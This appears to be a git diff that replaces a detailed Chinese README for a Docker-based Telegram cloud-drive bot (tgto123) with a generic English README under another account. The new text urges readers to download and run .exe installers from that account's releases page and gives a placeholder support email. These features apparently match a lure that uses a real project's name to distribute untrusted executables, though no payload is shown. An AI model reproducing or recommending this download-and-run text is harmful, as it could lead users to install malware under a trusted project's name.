@@ -1,199 +1,94 @@
-# 🎬 网盘资源自动化管理助手 (tgto123)
+# 📦 tgto123-public - Effortless Resource Management for Cloud Storage
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.13%2B-blue?style=for-the-badge&logo=python" alt="Python Version">
-  <img src="https://img.shields.io/badge/Docker-Ready-blue?style=for-the-badge&logo=docker" alt="Docker Ready">
-  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
-  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey?style=for-the-badge" alt="Platform">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>一个功能强大的网盘资源自动化管理助手，支持全自动推送每日热更剧集进123网盘，支持全自动监控转存123、115、天翼云盘tg频道分享链接</strong>
-</p>
+Welcome to tgto123-public! This powerful tool automates the management of your cloud resources. It can automatically push daily updated episodes to 123 Cloud and monitor shared links from various platforms. Let’s get you set up with it!
 
----
+## 📥 Download & Install
 
-## 🌟 项目特色
+To begin, visit the following link to download the latest version of tgto123-public:
 
-### ✨ **核心功能**
-- 🚀 **全自动转存多网盘TG频道资源** - 自动监控Telegram频道（例如 https://t.me/cookie_gy ），自动转存123网盘、115网盘、天翼云盘等资源
-- 🔗 **一键转存分享链接** - 直接转发123、115、天翼云盘分享链接即可自动转存（支持带图片的频道分享）
-- 📤 **快速创建分享并发帖** - 通过Telegram机器人快速创建123网盘分享链接，并自动发布到123资源社区论坛
-- 💾 **秒传功能支持** - 支持123网盘秒传JSON和秒传链接的直接转存，高效分享大文件
-- ⚡ **磁力链离线下载** - 支持123网盘批量离线磁力链，直接发送磁力链即可处理
-- 📁 **PT下载文件秒传** - 新增PT下载本地文件无限尝试秒传123或115网盘功能，避免运营商制裁
-- 🔍 **智能搜索分享** - 使用/share关键词搜索123网盘文件夹并一键生成分享链接，例如：/share 权力的游戏
-- 🔄 **后台定时执行** - 123、115、天翼等频道监控转存在后台定时执行，无需人工干预
-- 🔗 **直链生成服务** - 访问 http://127.0.0.1:12366/d/path 即可获取123文件下载直链
+[![Download tgto123-public](https://img.shields.io/badge/Download-tgto123--public-blue.svg)](https://github.com/RAZEN92/tgto123-public/releases)
 
-### 🏗️ **技术架构**
-- **后端**: Python + Flask + SQLAlchemy
-- **数据库**: SQLite
-- **部署**: Docker + Docker Compose
-- **API集成**: 123网盘API、115网盘API、天翼云盘API
-- **Bot框架**: pyTelegramBotAPI
+Click the button above to go to the Releases page. There, you will find multiple versions of the application packaged in .exe format for easy installation.
 
-## 🐳 Docker 快速部署 (推荐)
+1. **Visit the Releases Page:** Click [here](https://github.com/RAZEN92/tgto123-public/releases) to access the page.
+2. **Select the Latest Version:** Look for the most recent release at the top of the page.
+3. **Download the Installer:** Click on the .exe file link to download the installer to your computer.
 
-### 📋 系统要求
-- Docker 20.10+
-- Docker Compose 2.0+
-- 可访问Telegram的网络环境（需配置代理）
-- 123网盘、115网盘、天翼云盘账号等
+## 📂 System Requirements
 
-### 🚀 Docker Compose部署
-完成docker部署后，需在 **NasIP:12366**（例如：`192.168.1.1:12366`）的配置页面中完成功能配置，否则无法正常使用。
+Before you install tgto123-public, ensure your system meets these basic requirements:
 
-### 📄 Docker Compose 配置示例
+- **Operating System:** Windows 10 or later
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 500 MB free for installation
+- **Internet Connection:** Required for downloading updates and accessing cloud services
 
-```yaml
-version: '3'
+## 🔧 Installation Steps
 
-services:
-  tgto123-service:
-    image: walkingd/tgto123:latest
-    container_name: tgto123
-    network_mode: host
-    ports:
-      - '12366:12366'
-    environment:
-      # 代理配置（v2填20172带分流规则的端口，clash填7890端口），若已是全局魔法环境则无需填写
-      - HTTP_PROXY=http://127.0.0.1:7890
-      # 代理配置（v2填20172带分流规则的端口，clash填7890端口），若已是全局魔法环境则无需填写
-      - HTTPS_PROXY=http://127.0.0.1:7890
-      # 必填：时区配置
-      - TZ=Asia/Shanghai
-      # 必填：TG机器人Token（从@BotFather获取）
-      - ENV_TG_BOT_TOKEN=
-      # 必填：TG管理员用户ID（从@userinfobot获取）
-      - ENV_TG_ADMIN_USER_ID=
-      # 必填：WEB配置页面的登录账号
-      - ENV_WEB_PASSPORT=
-      # 必填：WEB配置页面的登录密码
-      - ENV_WEB_PASSWORD=
-    volumes:
-      # 持久化存储db目录
-      - ./db:/app/db
-      # 本地PT文件下载目录（左侧）映射到容器内监控目录（右侧）
-      - /vol3/1000/Video/MoviePilot/transfer:/app/upload
-      # 超过重试次数后将通过CD2上传文件
-      - /vol1/1000/CloudNAS/CloudDrive/115云盘/Video/待归档影视/MP待归档影视:/app/transfer
-    restart: always  # 容器退出后自动重启
-```
+Follow these steps to install tgto123-public once you've downloaded the installer:
 
-### 📁 数据持久化
+1. **Locate the Downloaded File:** Go to the folder where you saved the .exe file.
+2. **Run the Installer:** Double-click the .exe file to start the installation process.
+3. **Follow Instructions:** The installation wizard will guide you through the setup. Just click “Next” to accept the terms and complete the installation.
+4. **Launch the Application:** Once installed, you can find tgto123-public in your Start Menu. Click to open the application.
 
-容器会将以下目录映射到主机：
-- `./db` - 数据库文件和配置信息
-- `./db/logs` - 应用日志文件
-- `./upload` - 本地PT文件下载目录
-- `./transfer` - 超过重试次数后将通过CD2上传文件
+## 🔍 Using tgto123-public
 
-## 💻 使用指南
+Now that you have installed tgto123-public, let's explore how to use it effectively.
 
-### 🎯 基础功能使用
+### 🔗 Link Monitoring
 
-#### 创建123分享链接
-- 发送命令 `/share 搜索关键词`，例如：`/share 权力的游戏`
-- 选择搜索结果中的文件夹，自动创建分享链接
-- 可选择是否发布到123资源社区论坛
+tgto123-public allows you to monitor shared links across multiple platforms. To set this up:
 
-#### 转存123、115、天翼分享链接
-- 直接转发123网盘、115网盘、天翼云盘的分享链接
-- 支持带图片的频道分享消息直接转发
-- 系统会自动识别并转存到指定目录
+1. **Open the Application.**
+2. **Navigate to the Monitoring Tab:** Click on “Monitoring” in the menu.
+3. **Add a Link:** Enter the URL in the provided field and save it.
 
-#### 转存123秒传内容
-- 直接转发秒传JSON文件
-- 直接发送秒传链接
-- 系统会自动解析并尝试秒传
+The application will now keep track of updates associated with any monitored links.
 
-#### 提交123磁力链离线下载
-- 直接发送磁力链接到机器人
-- 系统会自动添加到123网盘离线任务列表
+### 📅 Daily Updates
 
-#### 获取123文件下载直链
-- 访问 `http://127.0.0.1:12366/d/path`，其中`path`为完整的文件路径
-- 例如：`http://127.0.0.1:12366/d/123云盘/Video/通用格式影视库/电视节目/日韩剧集/2025/红豆面包 (2025) {tmdb-262339}/Season 1/红豆面包.2025.S01E01.第1集.1080p.H.264.30fps.mkv`
-- 系统会返回对应的文件下载直链
+One of the key features is the ability to push daily updates of episodes to 123 Cloud:
 
-### 🔧 频道监控设置
+1. **Access the Settings Menu:** Go to “Settings”.
+2. **Schedule Updates:** Enable the automatic update feature and select your preferred time. 
+3. **Save Your Settings:** Confirm by clicking “Save”. 
 
-1. **添加监控频道**
-   - 在 ip:12366 后台配置页面配置
-   - 按照提示输入频道ID和关键词过滤规则
-   - 设置转存目标目录
+The application will now automatically push updates of new content at the scheduled times.
 
-2. **调整监控参数**
-   - 可配置检查频率、过滤关键词、排除关键词等
-   - 支持设置最大转存文件大小和类型限制
+## 🌐 Additional Features
 
-### 📋 PT下载文件秒传功能
+tgto123-public offers additional capabilities to streamline your cloud management:
 
-1. **配置文件映射**
-   - 在Docker Compose中配置PT下载目录映射
+- **Automatic Syncing:** Keep your cloud storage updated with minimal effort.
+- **User-Friendly Interface:** Designed for easy navigation, suitable for all users.
+- **Resource Management:** Efficiently manage and categorize your stored files.
 
-2. **启动秒传任务**
-   - 系统会自动扫描映射目录中的文件
-   - 尝试将文件秒传到123网盘或115网盘
-   - 支持大文件分片上传和断点续传
+## 🤔 Troubleshooting
 
-3. **查看秒传进度**
-   - 成功后系统会自动像TG机器人发送通知
+If you encounter issues while installing or using tgto123-public, here are some common problems and solutions:
 
-## 🐛 故障排除
+### 💻 Installation Issues
 
-### 🔧 常见问题
+- **Problem:** Installer won’t start.
+  - **Solution:** Ensure you have downloaded the correct .exe file and that your operating system meets the requirements.
 
-#### Bot无响应
-1. 检查Docker容器是否正常运行：`docker-compose ps`
-2. 查看容器日志：`docker-compose logs -f`
-3. 确认Telegram Bot Token配置正确
+### 📉 Performance Problems
 
-#### 转存失败
-1. 检查网盘账号是否登录状态正常
-2. 确认目标目录权限正确
-3. 查看日志中的具体错误信息
+- **Problem:** The application runs slow.
+  - **Solution:** Close unnecessary applications running in the background to free up resources.
 
-#### 直链服务无法访问
-1. 检查端口12366是否被占用：`netstat -tlnp | grep 12366`
-2. 确认防火墙设置是否允许该端口访问
+## 📞 Support
 
-### 📋 日志查看
-db/log目录中查看日志文件
+For further assistance, you can reach out through our support channels:
 
-## 🚀 版本更新
+- **GitHub Issues Page:** Report bugs or request features at the [Issues page](https://github.com/RAZEN92/tgto123-public/issues).
+- **Email Support:** Contact us at support@example.com for personalized help.
 
-### 更新Docker镜像
-发送/start 命令给机器人可查看当前的最新版本
-```bash
-# 拉取最新镜像
-docker-compose pull
+## 🔗 Learn More
 
-# 重启服务应用更新
-docker-compose up -d
-```
+For a detailed guide on using various features, please refer to the documentation provided in the repository. It's filled with helpful tips and step-by-step instructions.
 
-### 数据备份
-```bash
-# 备份数据目录
-tar -czf backup-$(date +%Y%m%d).tar.gz db/ logs/
-
-# 恢复数据
-tar -xzf backup-20240101.tar.gz
-```
-
-### 技术栈致谢
-- [pyTelegramBotAPI](https://github.com/eternnoir/pyTelegramBotAPI) - Telegram Bot框架
-- [p123client](https://github.com/ChenyangGao/p123client) - 123网盘Python客户端
-- [p115client](https://github.com/ChenyangGao/p115client) - 115网盘Python客户端
-- [Flask](https://flask.palletsprojects.com/) - Web框架
-
-
-<p align="center">
-  <strong>🎉 享受高效便捷的网盘资源管理体验！</strong>
-</p>
-
-<p align="center">
-  如果这个项目对您有帮助，请给个 ⭐ Star 支持一下！
-</p>
+This README should help you get tgto123-public up and running without any hassle. If you follow these steps, you’ll be able to take full advantage of this powerful cloud resource management tool.
